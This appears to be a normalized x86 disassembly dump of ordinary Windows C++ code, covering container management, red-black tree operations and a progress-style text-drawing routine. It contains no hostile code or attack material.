sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call [ std::_Xlength_error@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4138d0
mov ebx eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
sub eax ecx
sar eax 0x2
lea edx [ eax * 4 ]
push edx
push ecx
push ebx
call [ memmove@IAT ]
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
sar edi 0x2
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebx + eax * 4 ]
mov [ esi + 0x8 ] ecx
lea edx [ ebx + edi * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] ebx
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_413670
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_42a030
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call [ std::_Xout_of_range@IAT ]
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call [ operator delete@IAT ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_413960
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_421c70
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_421c10
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_421c70
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_421c10
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_421c10
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_421c70
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_4138d0
push ebp
mov ebp esp
push 0xffffffff
push sub_445259
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] 0x0
call [ std::exception::exception@IAT ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] r--data
mov [ ebp - 0x4 ] 0xffffffff
push r--data
lea edx [ ebp - 0x1c ]
push edx
call _CxxThrowException
lea eax [ ecx * 4 ]
push eax
call [ operator new@IAT ]
add esp 0x4
test eax eax
jne r-xdata
sub_413980
push ebp
mov ebp esp
sub eax ecx
push esi
sar eax 0x2
lea esi [ eax * 4 ]
mov eax [ ebp + 0x8 ]
push esi
push ecx
push eax
call [ memmove@IAT ]
add esp 0xc
add eax esi
pop esi
pop ebp
retn 0x4
sub_4139b0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx ecx
cmp [ ebx + 0x8 ] 0x0
push esi
mov esi eax
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
push esi
push 0x1
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ecx eax
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jae r-xdata
mov eax [ esi + 0xc ]
cmp eax [ ecx + 0xc ]
jae r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0xc ]
cmp edx [ esi + 0xc ]
jae r-xdata
push esi
push ebx
lea esi [ ebp - 0x8 ]
call sub_442d70
mov eax [ eax ]
pop esi
mov [ edi ] eax
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push 0x1
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jae r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_42a5d0
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0xc ]
cmp [ ecx + 0xc ] eax
jae r-xdata
push esi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ecx
call sub_42a030
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x4 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push esi
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ eax + 0xc ]
jae r-xdata
push 0x0
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push 0x1
push edi
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x1
push edi
mov ecx eax
call sub_442e40
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_413ad0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov [ ebp - 0x4 ] eax
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_414260
mov eax [ ebp - 0x8 ]
pop ebx
cmp eax [ esi + 0xb4 ]
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov eax [ eax + 0x10 ]
mov esp ebp
pop ebp
retn
sub_413b10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ eax + 0xc4 ]
mov [ esi ] edi
mov edi [ eax + 0xc8 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0xcc ]
mov [ esi + 0x8 ] edi
mov edi [ eax + 0xd0 ]
mov [ esi + 0xc ] edi
mov esi [ eax + 0xd4 ]
mov [ edx ] esi
mov esi [ eax + 0xd8 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0xdc ]
mov [ edx + 0x8 ] esi
mov esi [ eax + 0xe0 ]
mov [ edx + 0xc ] esi
mov edx [ eax + 0xe4 ]
mov [ ecx ] edx
mov edx [ eax + 0xe8 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0xec ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xf0 ]
pop edi
mov [ ecx + 0xc ] eax
pop esi
pop ebp
retn 0x4
sub_413b90
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x70 ] r--data
mov dl 0x1
mov [ ebp - 0x4 ] dl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] dl
mov [ ebp - 0x4 ] 0x2
mov edx 0x2a
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x78 ] ecx
mov [ eax + 0x7c ] 0x64
mov [ eax + 0x74 ] ecx
mov [ eax + 0x80 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_413c30
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_413cc0
mov eax [ esi + 0x7c ]
mov edx [ esi ]
mov [ esi + 0x74 ] eax
mov eax [ edx + 0x78 ]
mov ecx esi
call eax
test al al
je r-xdata
retn
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_413d10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4493e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x24 ] 0x0
mov [ esp + 0x1c ] esi
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x90 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax [ esi + 0x7c ]
sub eax [ esi + 0x78 ]
mov [ esp + 0x28 ] eax
je r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x18 ] 0x0
call sub_414260
mov edi [ edi + 0xb4 ]
mov eax [ esp + 0x10 ]
cmp eax edi
je r-xdata
mov edi [ eax + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x4 ]
mov cl [ eax + 0xa9 ]
mov [ esp + 0x10 ] cl
cmp [ eax + 0xf4 ] bl
je r-xdata
lea ecx [ esp + 0x3c ]
push ecx
lea ecx [ esp + 0x50 ]
lea edx [ esp + 0x70 ]
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x70 ] ebx
mov [ esp + 0x74 ] ebx
mov [ esp + 0x78 ] ebx
mov [ esp + 0x7c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] ebx
call sub_413b10
mov edx [ esi + 0x38 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x34 ]
lea ebx [ esi + 0x30 ]
mov [ esp + 0x34 ] edx
mov edx [ ebx + 0xc ]
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x44 ]
sub edx [ esp + 0x3c ]
mov [ esp + 0x2c ] eax
add edx eax
mov eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
mov [ esp + 0x30 ] ecx
add eax ecx
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x34 ]
mov [ esp + 0x3c ] edx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
push eax
push ecx
mov ecx edi
call edx
mov edx [ ebx + 0xc ]
mov ecx [ ebx + 0x8 ]
mov eax [ ebx ]
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x4c ]
sub edx [ esp + 0x54 ]
mov [ esp + 0x34 ] ecx
add edx ecx
mov ecx [ esp + 0x48 ]
sub ecx [ esp + 0x40 ]
mov [ esp + 0x2c ] eax
mov eax [ ebx + 0x4 ]
add ecx eax
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x38 ] ecx
push eax
lea ecx [ esp + 0x50 ]
push ecx
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x34 ]
mov [ esp + 0x34 ] edx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
push eax
push ecx
mov ecx edi
call edx
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
mov eax [ ebx ]
mov [ esp + 0x34 ] edx
mov edx [ ebx + 0xc ]
mov [ esp + 0x30 ] ecx
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x44 ]
sub edx [ esp + 0x3c ]
add eax edx
mov edx [ esp + 0x48 ]
sub edx [ esp + 0x40 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x4c ]
sub eax [ esp + 0x54 ]
add edx ecx
mov ecx [ esp + 0x10 ]
add [ esp + 0x34 ] eax
push ecx
mov [ esp + 0x3c ] edx
mov eax [ edi ]
mov eax [ eax + 0x18 ]
lea edx [ esp + 0x70 ]
push edx
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x34 ]
push ecx
push edx
mov ecx edi
call eax
cmp [ esi + 0x74 ] 0x0
je r-xdata
lea esi [ esp + 0x90 ]
call sub_41f610
mov ebx [ esp + 0x90 ]
mov eax [ esp + 0x98 ]
mov esi [ esp + 0x1c ]
sub eax ebx
imul eax [ esi + 0x74 ]
cdq
idiv [ esp + 0x28 ]
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov [ esp + 0x7c ] ecx
mov [ esp + 0x80 ] edx
mov edx [ esi + 0x38 ]
sub ecx ebx
mov [ esp + 0x84 ] edx
mov edx [ esi + 0x3c ]
mov [ esp + 0x88 ] edx
lea edx [ esp + 0x90 ]
add eax ebx
add ecx eax
mov [ esp + 0x84 ] ecx
mov ecx [ esp + 0x10 ]
push ecx
push edx
mov edx [ esp + 0x1c ]
mov [ esp + 0xa0 ] eax
mov eax [ edi ]
mov eax [ eax + 0x14 ]
lea ecx [ esp + 0x84 ]
push ecx
push edx
mov ecx edi
call eax
jmp r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x18 ]
lea edx [ eax + ecx ]
mov ecx [ esp + 0x44 ]
sub ecx eax
mov eax [ esp + 0x40 ]
mov [ esp + 0x5c ] edx
add edx ecx
mov [ esp + 0x64 ] edx
mov edx [ ebx ]
mov [ esp + 0x2c ] edx
mov edx [ ebx + 0x4 ]
add ecx [ esp + 0x2c ]
mov [ esp + 0x30 ] edx
mov edx [ ebx + 0x8 ]
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x48 ]
mov [ esp + 0x34 ] edx
mov edx [ ebx + 0xc ]
mov [ esp + 0x68 ] eax
sub eax [ esp + 0x40 ]
mov [ esp + 0x34 ] ecx
add eax [ esp + 0x30 ]
mov ecx [ esp + 0x10 ]
mov [ esp + 0x38 ] edx
push ecx
lea edx [ esp + 0x60 ]
push edx
mov edx [ esp + 0x1c ]
mov [ esp + 0x40 ] eax
mov eax [ edi ]
mov eax [ eax + 0x14 ]
lea ecx [ esp + 0x34 ]
push ecx
push edx
mov ecx edi
call eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
cdq
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x74 ]
mov ecx [ esp + 0x1c ]
push edx
cdq
push ecx
push edx
push eax
call sub_444a60
mov ecx eax
mov eax [ esp + 0x28 ]
mov [ esp + 0x80 ] edx
cdq
push edx
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x84 ]
push eax
push edx
push ecx
mov [ esp + 0x2c ] eax
call sub_444ad0
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
sub eax [ esp + 0x44 ]
mov [ esp + 0x2c ] ecx
mov ecx [ ebx + 0x8 ]
add eax [ esp + 0x3c ]
mov [ esp + 0x30 ] edx
mov edx [ ebx + 0xc ]
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x2c ]
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x44 ]
sub edx [ esp + 0x3c ]
add ecx edx
add eax ecx
mov [ esp + 0x2c ] ecx
mov ecx [ esi + 0x38 ]
sub ecx [ esp + 0x54 ]
mov [ esp + 0x34 ] eax
add ecx [ esp + 0x4c ]
cmp eax ecx
jle r-xdata
mov eax [ esp + 0x78 ]
sub eax [ esp + 0x70 ]
mov edx [ esp + 0x74 ]
add eax [ esp + 0x30 ]
mov ecx [ esp + 0x18 ]
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x6c ]
add ecx eax
sub edx eax
add edx ecx
mov [ esp + 0x5c ] ecx
mov ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x68 ] edx
mov eax [ edi ]
mov eax [ eax + 0x18 ]
lea edx [ esp + 0x60 ]
push edx
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x34 ]
push ecx
push edx
mov ecx edi
call eax
mov ecx [ esi + 0x74 ]
cmp ecx [ esi + 0x7c ]
jl r-xdata
mov [ esp + 0x34 ] ecx
cmp [ esi + 0x80 ] 0x0
je r-xdata
mov edx [ ebx ]
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov [ esp + 0x2c ] edx
mov edx [ ebx + 0xc ]
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x54 ]
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x4c ]
sub edx eax
add edx ecx
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x58 ]
sub ecx [ esp + 0x50 ]
mov [ esp + 0x2c ] edx
add ecx [ esp + 0x30 ]
mov edx [ esp + 0x4c ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x18 ]
add ecx edx
sub eax edx
add eax ecx
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x5c ] ecx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
push eax
lea ecx [ esp + 0x60 ]
push ecx
mov ecx [ esp + 0x1c ]
lea eax [ esp + 0x34 ]
push eax
push ecx
mov ecx edi
call edx
mov eax [ esi + 0x74 ]
mov edi [ esp + 0x1c ]
push 0x0
cdq
push 0x64
push edx
push eax
call sub_444a60
mov ecx [ esp + 0x20 ]
push ecx
push edi
push edx
push eax
call sub_444ad0
mov esi eax
lea eax [ esp + 0x24 ]
push eax
mov [ esp + 0x84 ] edx
call sub_402d40
mov [ esp + 0xb0 ] 0x0
push esi
push r--data
lea edi [ esp + 0x2c ]
call sub_401dc0
mov ecx [ esp + 0x1c ]
mov edx [ ecx + 0x8 ]
mov eax [ edx ]
add esp 0x8
mov [ esp + 0xb0 ] 0x1
mov ecx [ esp + 0x24 ]
push 0x225
push ebx
push 0xffffffff
push ecx
push eax
call [ DrawTextW@IAT ]
mov [ esp + 0xb0 ] 0xffffffff
mov ecx edi
call sub_402ca0
sub_414260
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov edx [ esi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
push edi
mov edi [ ebx ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebx ]
cmp esi [ edx + 0xc ]
jl r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn
cmp [ ecx + 0xc ] edi
jge r-xdata
pop edi
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_4142d0
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0xb4 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov eax [ edi + 0xb4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
mov esi ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0xb4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0xb4 ]
mov [ eax ] eax
mov eax [ edi + 0xb4 ]
mov [ eax + 0x8 ] eax
mov [ edi + 0xb8 ] 0x0
pop edi
pop esi
pop ebx
retn
jmp r-xdata
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov ecx [ esi + 0x8 ]
push ecx
lea ecx [ edi + 0xb0 ]
call sub_413500
mov esi [ esi ]
push ebx
call [ operator delete@IAT ]
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
cmp esi [ edi + 0xb4 ]
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
lea ecx [ ecx ]
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
jmp r-xdata
cmp esi [ eax + 0x8 ]
jne r-xdata
sub_4143a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ eax + 0xd4 ]
mov [ esi ] edi
mov edi [ eax + 0xd8 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0xdc ]
mov [ esi + 0x8 ] edi
mov edi [ eax + 0xe0 ]
mov [ esi + 0xc ] edi
mov esi [ eax + 0xe4 ]
mov [ edx ] esi
mov esi [ eax + 0xe8 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0xec ]
mov [ edx + 0x8 ] esi
mov esi [ eax + 0xf0 ]
mov [ edx + 0xc ] esi
mov edx [ eax + 0xf4 ]
mov [ ecx ] edx
mov edx [ eax + 0xf8 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0xfc ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0x100 ]
pop edi
mov [ ecx + 0xc ] eax
pop esi
pop ebp
retn 0x4
sub_414420
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ eax + 0x104 ]
mov [ esi ] edi
mov edi [ eax + 0x108 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x10c ]
mov [ esi + 0x8 ] edi
mov edi [ eax + 0x110 ]
mov [ esi + 0xc ] edi
mov esi [ eax + 0x114 ]
mov [ edx ] esi
mov esi [ eax + 0x118 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x11c ]
mov [ edx + 0x8 ] esi
mov esi [ eax + 0x120 ]
mov [ edx + 0xc ] esi
mov edx [ eax + 0x124 ]
mov [ ecx ] edx
mov edx [ eax + 0x128 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x12c ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0x130 ]
pop edi
mov [ ecx + 0xc ] eax
pop esi
pop ebp
retn 0x4
sub_4144a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ eax + 0x134 ]
mov [ esi ] edi
mov edi [ eax + 0x138 ]
mov [ esi + 0x4 ] edi
mov edi [ eax + 0x13c ]
mov [ esi + 0x8 ] edi
mov edi [ eax + 0x140 ]
mov [ esi + 0xc ] edi
mov esi [ eax + 0x144 ]
mov [ edx ] esi
mov esi [ eax + 0x148 ]
mov [ edx + 0x4 ] esi
mov esi [ eax + 0x14c ]
mov [ edx + 0x8 ] esi
mov esi [ eax + 0x150 ]
mov [ edx + 0xc ] esi
mov edx [ eax + 0x154 ]
mov [ ecx ] edx
mov edx [ eax + 0x158 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x15c ]
